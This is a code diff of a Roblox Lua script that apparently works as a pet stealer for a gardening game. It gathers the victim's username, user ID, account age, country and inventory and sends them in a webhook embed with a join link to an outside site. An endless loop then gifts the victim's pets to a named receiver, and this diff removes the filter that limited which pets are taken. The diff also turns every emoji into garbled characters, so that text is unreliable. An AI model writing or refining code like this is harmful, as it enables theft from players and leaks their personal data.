@@ -21,7 +21,6 @@
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
-
         
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
@@ -73,33 +72,33 @@
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
                 -- Regular pets
-                ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
-                ["Raccoon"] = { priority = 2, emoji = "🦝", isMutation = false },
-                ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
-                ["Fennec fox"] = { priority = 4, emoji = "🦊", isMutation = false },
-                ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
-                ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
-                ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
-                ["Corrupted Kitsune"] = { priority = 8, emoji = "🦊", isMutation = false },
-                ["T-Rex"] = { priority = 9, emoji = "🦖", isMutation = false },
-                ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
-                ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
-                ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
+                ["Kitsune"] = { priority = 1, emoji = "ðŸ¦Š", isMutation = false },
+                ["Raccoon"] = { priority = 2, emoji = "ðŸ¦", isMutation = false },
+                ["Disco Bee"] = { priority = 3, emoji = "ðŸª©", isMutation = false },
+                ["Fennec fox"] = { priority = 4, emoji = "ðŸ¦Š", isMutation = false },
+                ["Butterfly"] = { priority = 5, emoji = "ðŸ¦‹", isMutation = false },
+                ["Dragonfly"] = { priority = 6, emoji = "ðŸ²", isMutation = false },
+                ["Mimic Octopus"] = { priority = 7, emoji = "ðŸ™", isMutation = false },
+                ["Corrupted Kitsune"] = { priority = 8, emoji = "ðŸ¦Š", isMutation = false },
+                ["T-Rex"] = { priority = 9, emoji = "ðŸ¦–", isMutation = false },
+                ["Spinosaurus"] = { priority = 10, emoji = "ðŸ«Ž", isMutation = false },
+                ["Queen Bee"] = { priority = 11, emoji = "ðŸ‘‘", isMutation = false },
+                ["Red Fox"] = { priority = 26, emoji = "ðŸ¦Š", isMutation = false },
                 -- Mutations
-                ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
-                ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
-                ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
-                ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
-                ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
-                ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
-                ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
-                ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
-                ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
-                ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
-                ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
-                ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
-                ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
-                ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
+                ["Ascended"] = { priority = 14, emoji = "ðŸ”º", isMutation = true },
+                ["Mega"] = { priority = 15, emoji = "ðŸ˜", isMutation = true },
+                ["Shocked"] = { priority = 16, emoji = "âš¡", isMutation = true },
+                ["Rainbow"] = { priority = 17, emoji = "ðŸŒˆ", isMutation = true },
+                ["Radiant"] = { priority = 18, emoji = "ðŸ›¡ï¸", isMutation = true },
+                ["Corrupted"] = { priority = 19, emoji = "ðŸ§¿", isMutation = true },
+                ["IronSkin"] = { priority = 20, emoji = "ðŸ’¥", isMutation = true },
+                ["Tiny"] = { priority = 21, emoji = "ðŸ”¹", isMutation = true },
+                ["Golden"] = { priority = 22, emoji = "ðŸ¥‡", isMutation = true },
+                ["Frozen"] = { priority = 23, emoji = "â„ï¸", isMutation = true },
+                ["Windy"] = { priority = 24, emoji = "ðŸŒªï¸", isMutation = true },
+                ["Inverted"] = { priority = 25, emoji = "ðŸ”„", isMutation = true },
+                ["Shiny"] = { priority = 26, emoji = "âœ¨", isMutation = true },
+                ["Tranquil"] = { priority = 27, emoji = "ðŸ§˜", isMutation = true },
             }
 
         local function detectExecutor()
@@ -335,7 +334,7 @@ if #pets > 0 then
     petString = ""
     for _, pet in ipairs(pets) do
         local highestPriority = 99
-        local chosenEmoji = "🐶"
+        local chosenEmoji = "ðŸ¶"
         local mutation = isMutated(pet.PetName)
         local mutationData = mutation and PetPriorityData[mutation] or nil
         local petData = PetPriorityData[pet.Type] or nil
@@ -348,15 +347,15 @@ if #pets > 0 then
             chosenEmoji = mutationData.emoji
         elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
             highestPriority = 12
-            chosenEmoji = "🐘"
+            chosenEmoji = "ðŸ˜"
         elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
             highestPriority = 13
-            chosenEmoji = "👴"
+            chosenEmoji = "ðŸ‘´"
         end
 
         local petName = pet.PetName
         local petValue = pet.Formatted
-        petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
+        petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " â†’ " .. petValue
     end
 end
 
@@ -404,62 +403,62 @@ end
                 color = 57855,
                 fields = {
                     {
-                        name = "🪪 Display Name",
+                        name = "ðŸªª Display Name",
                         value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "👤 Username",
+                        name = "ðŸ‘¤ Username",
                         value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "🆔 User ID",
+                        name = "ðŸ†” User ID",
                         value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
                         inline = true
                     },
                     {
-                        name = "📅 Account Age",
+                        name = "ðŸ“… Account Age",
                         value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
                         inline = true
                     },
                     {
-                        name = "💎 Receiver",
+                        name = "ðŸ’Ž Receiver",
                         value = "```" .. (Username or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "🎂 Account Created",
+                        name = "ðŸŽ‚ Account Created",
                         value = "```" .. (creationDateString or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "💻 Executor",
+                        name = "ðŸ’» Executor",
                         value = "```" .. (detectExecutor() or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "🌍 Country",
+                        name = "ðŸŒ Country",
                         value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
                         inline = true
                     },
                     {
-                        name = "📡 Player Count",
+                        name = "ðŸ“¡ Player Count",
                         value = "```" .. (playerCount or 0) .. "/5```",
                         inline = true
                     },
                     {
-                        name = "💰 Backpack",
+                        name = "ðŸ’° Backpack",
                         value = "```" .. truncateByLines(petString, 20) .. "```",
                         inline = false
                     },
                     {
-                        name = "🚀 Join Script",
+                        name = "ðŸš€ Join Script",
                         value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
                         inline = false
                     },
                     {
-                        name = "🔗 Join with URL",
+                        name = "ðŸ”— Join with URL",
                         value = "[Click here to join](https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                         inline = false
                     }
@@ -692,21 +691,13 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
             end)
 
             if success then
-                print("GIFTED:", held.Name, "→", receiverPlr.DisplayName)
+                print("GIFTED:", held.Name, "â†’", receiverPlr.DisplayName)
                 return true
             else
                 warn("Gift failed:", err)
                 return false
             end
         end
-
-local AllowedPets = {
-    ["Kitsune"] = true,
-    ["Corrupted Kitsune"] = true, -- optional
-    ["Mega Kitsune"] = true,      -- optional if mutation version exists
-    ["Mimic Octopus"] = true,
-    ["Dilophosaurus"] = true,
-}
 
         -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
         task.spawn(function()
@@ -716,23 +707,14 @@ local AllowedPets = {
                 if #currentPets == 0 then continue end
 
                 for _, pet in ipairs(currentPets) do
-    local cleanName = pet.PetName:gsub(" %[.*%]", "")  -- removes [Age], [Weight], etc
-    if not AllowedPets[cleanName] then
-        -- Skip this pet
-        continue
-    end
-    -- ----------------------------------------
+                    for _, tool in targetPlr.Backpack:GetChildren() do
+                        if tool:IsA("Tool")
+                        and tool:GetAttribute("ItemType") == "Pet"
+                        and tool:GetAttribute("PET_UUID") == pet.Id then
 
-    for _, tool in targetPlr.Backpack:GetChildren() do
-        if tool:IsA("Tool")
-        and tool:GetAttribute("ItemType") == "Pet"
-        and tool:GetAttribute("PET_UUID") == pet.Id then
-
-            print("Equipping & gifting:", tool.Name)
-            targetPlr.Character.Humanoid:EquipTool(tool)
-            task.wait(0.5)
-            giftHeldPet()
-            task.wait(0.5)
+                            print("Equipping & gifting:", tool.Name)
+                            targetPlr.Character.Humanoid:EquipTool(tool)
+                            task.wait(0.6)
 
                             for i = 1, 3 do
                                 if giftHeldPet() then
